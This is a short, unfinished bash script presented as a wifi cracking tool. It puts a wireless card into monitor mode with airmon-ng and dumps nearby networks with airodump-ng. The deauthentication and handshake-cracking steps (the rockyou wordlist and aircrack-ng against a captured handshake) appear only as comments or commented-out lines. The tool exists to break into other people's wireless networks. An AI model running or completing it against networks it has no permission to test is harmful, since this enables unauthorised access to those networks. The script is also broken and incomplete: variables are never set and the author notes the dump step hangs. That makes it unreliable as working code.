#!/bin/bash

echo "### Tyreks's wifi cracking tool v0.1 ###";

#get the essid of the targeted network
#essid = $1

#identify the interface that will be used to monitor and inject

echo "Identifying the interface that will be used : ";

#interf=$(iwconfig | grep "IEEE 802.11" | tr -s ' ' | cut -d ' ' -f 1);

read managed_interf_name <<<$(iwconfig|grep "IEEE 802.11" | tr -s ' ' | cut -d ' ' -f 1);


echo "found suitable interface : $managed_interf_name";

#stopping the interface

#killing all processes that could cause trouble
#sudo airmon-ng check kill

#setting the interface in monitoring mode
#sudo ip link set wlan0 down && sudo iwconfig wlan0 mode monitor && sudo ip link set wlan0 up && sudo airmon-ng start $managed_interf_name

#starting the monitoring interface
sudo airmon-ng start $managed_interf_name

#update the new name of the interface in monitoring mode
read monitoring_interf_name <<<$(iwconfig|grep "IEEE 802.11" | tr -s ' ' | cut -d ' ' -f 1);
echo "new interface name in monitoring mode : $monitoring_interf_name";


# mettre un place un systeme de timer et d'interruption
#parallel --timeout 5 -j 8 -N0 ../sage ./loader.sage.py ::: {1..4000} 2>/dev/null

#dumping wifi network : probleme ici, je perds la main apres cette cmd
read dumped_networks <<<$(timeout -s STOP 3 sudo airodump-ng $monitoring_interf_name)

#get the bssid and the channel of the targeted network
#channel = 1
#bssid = 

echo "dumped networks : $dumped_networks"

#stop the monitoring interface

#restart the monitoring interface on the right channel

#in an other thread, send the clients disconnecting message

#now the handshake have been captured, stop the monitoring 
sudo airmon-ng stop $monitoring_interf_name

#replace the interface in managed mode
sudo ip link set $managed_interf_name down && sudo iwconfig $managed_interf_name mode Managed && sudo ip link set $managed_interf_name up

#restart the network
sudo service networking stop && sudo service networking start 


#start the handshake cracking
#sudo cp /usr/share/wordlists/rockyou.txt.gz .
#sudo gunzip ./rockyou.txt
#sudo aircrack-ng -0 2 -b $bssid -w cle out.cap
